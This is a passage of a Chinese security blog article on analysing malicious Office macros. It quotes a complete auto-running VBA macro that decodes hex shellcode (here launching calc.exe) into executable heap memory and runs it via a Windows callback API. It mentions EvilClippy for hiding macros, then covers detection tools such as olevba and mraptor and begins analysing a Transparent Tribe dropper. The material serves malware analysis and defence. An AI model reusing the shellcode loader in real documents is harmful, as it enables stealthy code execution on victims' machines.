code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="sql"><code><span class="code-snippet_outer">Private <span class="code-snippet__keyword">Declare</span> <span class="code-snippet__keyword">Function</span> createMemory Lib <span class="code-snippet__string">"kernel32"</span> <span class="code-snippet__keyword">Alias</span> <span class="code-snippet__string">"HeapCreate"</span> (ByVal flOptions <span class="code-snippet__keyword">As</span> <span class="code-snippet__keyword">Long</span>, ByVal dwInitialSize <span class="code-snippet__keyword">As</span> <span class="code-snippet__keyword">Long</span>, ByVal dwMaximumSize <span class="code-snippet__keyword">As</span> <span class="code-snippet__keyword">Long</span>) <span class="code-snippet__keyword">As</span> <span class="code-snippet__keyword">Long</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">Private</span> <span class="code-snippet__keyword">Declare</span> <span class="code-snippet__keyword">Function</span> allocateMemory Lib <span class="code-snippet__string">"kernel32"</span> <span class="code-snippet__keyword">Alias</span> <span class="code-snippet__string">"HeapAlloc"</span> (ByVal hHeap <span class="code-snippet__keyword">As</span> <span class="code-snippet__keyword">Long</span>, ByVal dwFlags <span class="code-snippet__keyword">As</span> <span class="code-snippet__keyword">Long</span>, ByVal dwBytes <span class="code-snippet__keyword">As</span> <span class="code-snippet__keyword">Long</span>) <span class="code-snippet__keyword">As</span> <span class="code-snippet__keyword">Long</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">Private</span> <span class="code-snippet__keyword">Declare</span> Sub copyMemory Lib <span class="code-snippet__string">"ntdll"</span> <span class="code-snippet__keyword">Alias</span> <span class="code-snippet__string">"RtlMoveMemory"</span> (pDst <span class="code-snippet__keyword">As</span> <span class="code-snippet__keyword">Any</span>, pSrc <span class="code-snippet__keyword">As</span> <span class="code-snippet__keyword">Any</span>, ByVal ByteLen <span class="code-snippet__keyword">As</span> <span class="code-snippet__keyword">Long</span>)</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">Private</span> <span class="code-snippet__keyword">Declare</span> <span class="code-snippet__keyword">Function</span> shellExecute Lib <span class="code-snippet__string">"kernel32"</span> <span class="code-snippet__keyword">Alias</span> <span class="code-snippet__string">"EnumSystemCodePagesW"</span> (ByVal lpCodePageEnumProc <span class="code-snippet__keyword">As</span> <span class="code-snippet__keyword">Any</span>, ByVal dwFlags <span class="code-snippet__keyword">As</span> <span class="code-snippet__keyword">Any</span>) <span class="code-snippet__keyword">As</span> <span class="code-snippet__keyword">Long</span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">Private</span> Sub Document_Open()</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">Dim shellCode <span class="code-snippet__keyword">As</span> <span class="code-snippet__keyword">String</span></span></code><code><span class="code-snippet_outer">Dim shellLength <span class="code-snippet__keyword">As</span> <span class="code-snippet__keyword">Byte</span></span></code><code><span class="code-snippet_outer">Dim byteArray() <span class="code-snippet__keyword">As</span> <span class="code-snippet__keyword">Byte</span></span></code><code><span class="code-snippet_outer">Dim memoryAddress <span class="code-snippet__keyword">As</span> <span class="code-snippet__keyword">Long</span></span></code><code><span class="code-snippet_outer">Dim zL <span class="code-snippet__keyword">As</span> <span class="code-snippet__keyword">Long</span></span></code><code><span class="code-snippet_outer">zL = <span class="code-snippet__number">0</span></span></code><code><span class="code-snippet_outer">Dim rL <span class="code-snippet__keyword">As</span> <span class="code-snippet__keyword">Long</span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">shellCode = <span class="code-snippet__string">"fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6a018d85b20000005068318b6f87ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd563616c632e65786500"</span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">shellLength = <span class="code-snippet__keyword">Len</span>(shellCode) / <span class="code-snippet__number">2</span></span></code><code><span class="code-snippet_outer">ReDim byteArray(<span class="code-snippet__number">0</span> <span class="code-snippet__keyword">To</span> shellLength)</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">For</span> i = <span class="code-snippet__number">0</span> <span class="code-snippet__keyword">To</span> shellLength - <span class="code-snippet__number">1</span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">If</span> i = <span class="code-snippet__number">0</span> <span class="code-snippet__keyword">Then</span></span></code><code><span class="code-snippet_outer">        pos = i + <span class="code-snippet__number">1</span></span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">Else</span></span></code><code><span class="code-snippet_outer">        pos = i * <span class="code-snippet__number">2</span> + <span class="code-snippet__number">1</span></span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">End</span> <span class="code-snippet__keyword">If</span></span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">Value</span> = <span class="code-snippet__keyword">Mid</span>(shellCode, pos, <span class="code-snippet__number">2</span>)</span></code><code><span class="code-snippet_outer">    byteArray(i) = Val(<span class="code-snippet__string">"&amp;H"</span> &amp; <span class="code-snippet__keyword">Value</span>)</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">Next</span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">rL = createMemory(&amp;H40000, zL, zL)</span></code><code><span class="code-snippet_outer">memoryAddress = allocateMemory(rL, zL, &amp;H5000)</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">copyMemory ByVal memoryAddress, byteArray(<span class="code-snippet__number">0</span>), UBound(byteArray) + <span class="code-snippet__number">1</span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">executeResult = shellExecute(memoryAddress, zL)</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">End</span> Sub</span></code></pre></section></pre><p><br  /></p><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">源代码来自：</span><span style="font-size:15px;line-height:35px;;">http://ropgadget.com/posts/abusing_win_functions.html</span><br style="box-sizing: border-box;"  /><span style="font-size:15px;line-height:35px;;">代码的前四行用于引用系统库，调用系统API<br style="box-sizing: border-box;"  />16行处是shellcode的十六进制编码，在这个例子中功能是打开计算器。<br style="box-sizing: border-box;"  />29行处是将shellcode的十六进制编码转换为二进制数据流<br style="box-sizing: border-box;"  />36行处将shellcode copy到了buffer处<br style="box-sizing: border-box;"  />38处执行了shellcode</span></section><p><br  /></p><h3 name="h3-7" style="box-sizing: border-box;margin: 5px 16px 0.5rem;font family: inherit;color: rgba(0, 0, 0, 0.85);font-size:19px;line-height:39px;;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">关于office的加密</span></h3><p><br  /></p><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">在97到2003版本的时候，文件加密的概念还不流行，那个时候的宏代码几乎从来没有加密过，2007版本之后，才开始通过加密的方式将VBA代码保护起来<br style="box-sizing: border-box;"  />分享两个解密的工具：<br style="box-sizing: border-box;"  /></span><span style="font-size:15px;line-height:35px;;">https://github.com/nolze/msoffcrypto-tool</span><br style="box-sizing: border-box;"  /><span style="font-size:15px;line-height:35px;;">https://github.com/herumi/msoffice</span></section><p><br  /></p><h3 name="h3-8" style="box-sizing: border-box;margin: 5px 16px 0.5rem;font family: inherit;color: rgba(0, 0, 0, 0.85);font-size:19px;line-height:39px;;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">宏代码的分析工具</span></h3><p><br  /></p><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">1.1. 首先可以使用VBA编辑器（比如在office文档里面按alt + F11），通过VBA编辑器可以很方便的调试和跟踪<br style="box-sizing: border-box;"  />这里不得不提一下从VBA编辑器隐藏VBA代码的技巧：</span><span style="font-size:15px;line-height:35px;;">https://github.com/outflanknl/EvilClippy</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">2.olevba：</span><span style="font-size:15px;line-height:35px;;">https://github.com/decalage2/oletools/wiki/olevba</span><br style="box-sizing: border-box;"  /><span style="font-size:15px;line-height:35px;;">该工具可以有效的提取office文档中的宏代码，需要python环境支持。</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.4647887323943662" data-type="png" data-w="1207" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/4_tWlzSoyKT7Ye8mxRqOU8MxYjL2tEZA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibMcJNVzzIu3h04EDFencous2UtWlzSoyKT7Ye8mxRqOU8MxYjL2tEZA/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: left;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">上面这张图列举了olevba所支持的类型，和一些值得关注的地方，比如自动触发代码、一些危险的关键词（Downloads、File writes、Shell execution DLL calls等）、还有一些IOCs</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: left;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">当然很多时候静态分析不能解决问题，还是需要动态分析才能更好地了解恶意代码的功能。这里分享一个软件ViperMonkey：</span><span style="font-size:15px;line-height:35px;;">https://github.com/decalage2/ViperMonkey</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: left;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">运行结构如下：</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.40654952076677314" data-type="png" data-w="1252" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/5_uu1MhRJTTazIfRgDd3qicQcMGBMdrg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPib6DS5xtibz17icxZ5wotj4szwX53uu1MhRJTTazIfRgDd3qicQcMGBMdrg/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><p><br  /></p><h3 name="h3-9" style="box-sizing: border-box;margin: 5px 16px 0.5rem;font family: inherit;color: rgba(0, 0, 0, 0.85);font-size:19px;line-height:39px;;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">mraptor</span></h3><p><br  /></p><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">mraptor是github上一个开源的宏代码检测项目<br style="box-sizing: border-box;"  /></span><span style="font-size:15px;line-height:35px;;">https://github.com/decalage2/oletools/wiki/mraptor</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">大概介绍一下原理：<br style="box-sizing: border-box;"  />mraptor有三个检测标准，分别是：<br style="box-sizing: border-box;"  />A 自动执行（触发器）<br style="box-sizing: border-box;"  />W 写入文件系统或内存<br style="box-sizing: border-box;"  />X 在VBA上下文外执行文件或任何payload<br style="box-sizing: border-box;"  />当某个office宏满足了A条件，那么W和X只要满足任意一条，则会被mraptor标注为恶意。<br style="box-sizing: border-box;"  />该项目依赖python环境，用法如下：</span></section><p><br  /></p><pre style="box-sizing: border-box;font family: SFMono-Regular, Menlo, Monaco, Consolas, &#39;Liberation Mono&#39;, &#39;Courier New&#39;, monospace;font-size:14px;line-height:34px;;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);"><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="swift"><code><span class="code-snippet_outer"><span class="code-snippet__type">Usage</span>: mraptor [options] &lt;filename&gt; [filename2 ...]</span></code><code><span class="code-snippet_outer"><span class="code-snippet__type">Options</span>:</span></code><code><span class="code-snippet_outer">  -h, --help            show this help message and exit</span></code><code><span class="code-snippet_outer">  -r                    <span class="code-snippet__built_in">find</span> files recursively <span class="code-snippet__keyword">in</span> subdirectories.</span></code><code><span class="code-snippet_outer">  -z <span class="code-snippet__type">ZIP_PASSWORD</span>, --<span class="code-snippet__built_in">zip</span>=<span class="code-snippet__type">ZIP_PASSWORD</span></span></code><code><span class="code-snippet_outer">                        <span class="code-snippet__keyword">if</span> the file <span class="code-snippet__keyword">is</span> a <span class="code-snippet__built_in">zip</span> archive, <span class="code-snippet__keyword">open</span> all files from it,</span></code><code><span class="code-snippet_outer">                        using the provided password (requires <span class="code-snippet__type">Python</span> <span class="code-snippet__number">2.6</span>+)</span></code><code><span class="code-snippet_outer">  -f <span class="code-snippet__type">ZIP_FNAME</span>, --zipfname=<span class="code-snippet__type">ZIP_FNAME</span></span></code><code><span class="code-snippet_outer">                        <span class="code-snippet__keyword">if</span> the file <span class="code-snippet__keyword">is</span> a <span class="code-snippet__built_in">zip</span> archive, file(s) to be opened</span></code><code><span class="code-snippet_outer">                        within the <span class="code-snippet__built_in">zip</span>. <span class="code-snippet__type">Wildcards</span> * and ? are supported.</span></code><code><span class="code-snippet_outer">                        (<span class="code-snippet__keyword">default</span>:*)</span></code><code><span class="code-snippet_outer">  -l <span class="code-snippet__type">LOGLEVEL</span>, --loglevel=<span class="code-snippet__type">LOGLEVEL</span></span></code><code><span class="code-snippet_outer">                        logging level debug/info/warning/error/critical</span></code><code><span class="code-snippet_outer">                        (<span class="code-snippet__keyword">default</span>=warning)</span></code><code><span class="code-snippet_outer">  -m, --matches         <span class="code-snippet__type">Show</span> matched strings.</span></code><code><span class="code-snippet_outer"><span class="code-snippet__type">An</span> exit code <span class="code-snippet__keyword">is</span> returned based on the analysis result:</span></code><code><span class="code-snippet_outer"> - <span class="code-snippet__number">0</span>: <span class="code-snippet__type">No</span> <span class="code-snippet__type">Macro</span></span></code><code><span class="code-snippet_outer"> - <span class="code-snippet__number">1</span>: <span class="code-snippet__type">Not</span> <span class="code-snippet__type">MS</span> <span class="code-snippet__type">Office</span></span></code><code><span class="code-snippet_outer"> - <span class="code-snippet__number">2</span>: <span class="code-snippet__type">Macro</span> <span class="code-snippet__type">OK</span></span></code><code><span class="code-snippet_outer"> - <span class="code-snippet__number">10</span>: <span class="code-snippet__type">ERROR</span></span></code><code><span class="code-snippet_outer"> - <span class="code-snippet__number">20</span>: <span class="code-snippet__type">SUSPICIOUS</span></span></code></pre></section></pre><p><br  /></p><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">如果要扫描单个文件，可以使用如下命令<br style="box-sizing: border-box;"  />mraptro file.doc</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">&nbsp;</span></section><section data-tools="新媒体排版" data-id="13745" data-style-type="标题"><section data-tools="新媒体管家" style="width: fit-content;visibility: visible;max-width: 100%;"><section style="display: flex;justify-content: center;margin: 0px 16px;visibility: visible;max-width: 100%;"><section data-darkmode-bgimage="1" data-darkmode-bgimage-15933958453571="1" data-darkmode-color="rgba(0,0,0,0.9)" data-darkmode-color-15933958453571="#191919" data-style="width: 63px; height: 24px; background-image: url(&quot;https://static.xmt.cn/img/08213e0d39b942e78aea5e14f79271c4.png&quot;); background-size: contain; background-position: center center; transform: translateY(2px); visibility: visible;" style="width: 63px;height: 24px;background-image: url(&quot;https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPiblKcBL4WXNMFxZpdoW1ubgIvObsmLSy3XnbElbHqFibzvKSDiauWbfyQA/640?wx_fmt=png&quot;);background-size: contain;background-position: center center;transform: translateY(2px);visibility: visible;max-width: 100%;"><br data-darkmode-bgimage-15933958453571="1" data-darkmode-color-15933958453571="#191919" style="visibility: visible;" data-darkmode-bgimage="1" data-darkmode-color="rgba(0,0,0,0.9)"  /><br style="display:none;"  /></section><section style="display: flex;align-items: flex-end;font-size:16px;line-height:36px;;font-weight: 700;color: rgb(182, 0, 0);letter-spacing: 1.78px;text-align: center;line-height: 22px;font family: &#39;PingFang SC&#39;, 微软雅黑, mp-quote, -apple-system-font, BlinkMacSystemFont, &#39;Helvetica Neue&#39;, &#39;Hiragino Sans GB&#39;, &#39;Microsoft YaHei UI&#39;, &#39;Microsoft YaHei&#39;, Arial, sans-serif;margin: 0px 12px;visibility: visible;max-width: 100%;" data-darkmode-color-15933958453571="rgb(255, 22, 22)" data-darkmode-original-color-15933958453571="rgb(182, 0, 0)" data-style="display: flex; align-items: flex-end; font-size:16px;line-height:36px;; font-weight: 700; color: rgb(182, 0, 0); letter-spacing: 1.78px; text-align: center; line-height: 22px; font family: &#39;PingFang SC&#39;, 微软雅黑, mp-quote, -apple-system-font, BlinkMacSystemFont, &#39;Helvetica Neue&#39;, &#39;Hiragino Sans GB&#39;, &#39;Microsoft YaHei UI&#39;, &#39;Microsoft YaHei&#39;, Arial, sans-serif; margin: 0px 12px; visibility: visible;" data-darkmode-color="rgb(255, 22, 22)" data-darkmode-original-color="rgb(182, 0, 0)"><section style="min-width: 16px;white-space: nowrap;visibility: visible;max-width: 100%;" data-darkmode-color-15933958453571="rgb(255, 22, 22)" data-darkmode-original-color-15933958453571="rgb(182, 0, 0)" data-darkmode-color="rgb(255, 22, 22)" data-darkmode-original-color="rgb(182, 0, 0)">0x02 TransparentTribe的Dropper样本</section></section></section></section></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: left;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">样本md5:bce8a8ea8d47951abffeec38fbeeeef1<br style="box-sizing: border-box;"  />样本app.any.run沙箱链接：</span><span style="font-size:15px;line-height:35px;;color: rgb(97, 178, 159);text-decoration: underline;">https://app.any.run/tasks/d6d22f4e-0376-49f5-8480-d07489a4e03b/</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.45" data-type="png" data-w="1860" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/6_9foQTA4zGxQwjQ9aiaCkcIxsibTfFA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibYjZywFEOXqzRAsUxLpsO0cWibIg9foQTA4zGxQwjQ9aiaCkcIxsibTfFA/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">且从any的沙箱中，我们可以看到，该样本原始类型是xls。</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">我们将样本下载到本地，然后添加xls后缀打开(本地测试环境为office2013)。</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.4240506329113924" data-type="png" data-w="1422" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/7_0tUqsX7u5Pc7miavw9rTcrd9MbQ2tw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibfo9W7oiagmCeqeicsnpnCtALKS30tUqsX7u5Pc7miavw9rTcrd9MbQ2tw/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">该样本打开之后，没有任何的信息，office官方弹框提示用户选择启用/禁用宏。<br style="box-sizing: border-box;"  />这里如果选择禁用的话，那么后续文档将显示为空：</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.42954070981210857" data-type="png" data-w="1916" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/8_KJkYwMhn57130P6ugR1ibcU4UTx1FQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibpO2A7Vz8lZWFblLJ6N57ibBoZFKJkYwMhn57130P6ugR1ibcU4UTx1FQ/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">这是攻击者一种迷惑用户的手法，诱导用户第二次重新打开并启用宏：</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.42089326267978805" data-type="png" data-w="1321" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/9_kSFRSfyANDcV9zYTNemwMfExDKyK4A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibOAqmwuLQF1m2eGkfc4k7SvFiakSFRSfyANDcV9zYTNemwMfExDKyK4A/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">翻译后内容大概如下：</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.3198031980319803" data-type="png" data-w="813" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/10_yNwYSDZrbLPDo4fpXG1aQFbeOp457Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPib0tcjDKGMZkfvqZyo7m3DydUOyNwYSDZrbLPDo4fpXG1aQFbeOp457Q/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">翻译文档内容的意义在于，通常来说，为了隐藏攻击痕迹，攻击者都会使用一个看起来正常的文档以迷惑用户。让用户以为打开的就是正常的文档，当用户认定这是一个正常文档，文档中的内容有”价值”时，往往就不会起疑心，木马就能够长时间的运行在用户的计算机上。所以我们通过文档的内容，通常情况下就可以推测出受攻击的目标。可以在攻击的背景分析中提供一些有用的信息。</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">我们从该样本的文档内容中大概可以得知此次攻击的目标是国防部，文档中提到了一个</span><span style="font-size:15px;line-height:35px;;">jsls@ddpmod.gov.in</span><span style="font-size:15px;line-height:35px;;">的邮箱，我们通过对后面域名的查询，基本可以确定该文档是针对印度国防部的攻击文档：</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.4765380604796663" data-type="png" data-w="1918" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/11_ic7fNgNyC507PZ9ticMZYynCluJAng.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibRTichYgPUDHzFVP5ZiaYAGeL0Q1Kic7fNgNyC507PZ9ticMZYynCluJAng/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">由这个信息，我们也可以大概的对攻击者进行一个猜测。<br style="box-sizing: border-box;"  />由攻击目标为印度，根据已有的信息，我们可以找到一些针对印度的攻击组织，如Confucius 、APT36(C-Major、Transparent Tribe)、GravityRAT等。</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">接下来我们看看具体的恶意宏代码。</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">在打开的xls文档中，安ALT + F11，即可打开宏窗口，红框中的内容即为该文档的宏对象。</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.5507757404795487" data-type="png" data-w="1418" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/12_eemk0Rbne61lcXk7nF7kB4aTLW9gsQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibEZO56fj8tEFD4kKSs91OAG0ceemk0Rbne61lcXk7nF7kB4aTLW9gsQ/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">依次展开选项卡，可以看到有两个对象有数据，一个是名为UserForm1的窗体，一个是名为Module1的模块</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.455704270235819" data-type="png" data-w="1569" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/13_z2lf2D7LxEho4OFvDmg8VXY8uw47mw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibPkV7CdbMa2kxkmAj7fpbUD5qz2lf2D7LxEho4OFvDmg8VXY8uw47mw/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">我们直接将鼠标光标定位到右边的Module1模块中，然后按下键盘的F8，开始调试。<br style="box-sizing: border-box;"  />在通过office调试宏代码时，调试的快捷键和od、x64dbg这种调试器有部分区别，具体如下：</span></section><p><br  /></p><p style="text-align: center;"><img class="rich_pages" data-ratio="1.2335766423357664" data-s="300,640" data-type="png" data-w="274" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/14_exh4NfSiaqvPhzXAKia4ysicXvqK1g.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibick4ib384Ea80nqDnc6Y35qqEEf67exh4NfSiaqvPhzXAKia4ysicXvqK1g/640?wx_fmt=png'" style=""  /></p><p><br  /></p><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><br  /></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">这里F8类似于od中的F7，会逐语句执行代码，当遇到函数调用时，F8会跟进到函数内部。</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">逐过程Shift + F8相当于od中的F8，遇到函数调用时，将会直接执行完函数而不进入函数。</span></section><section style="box-sizing: 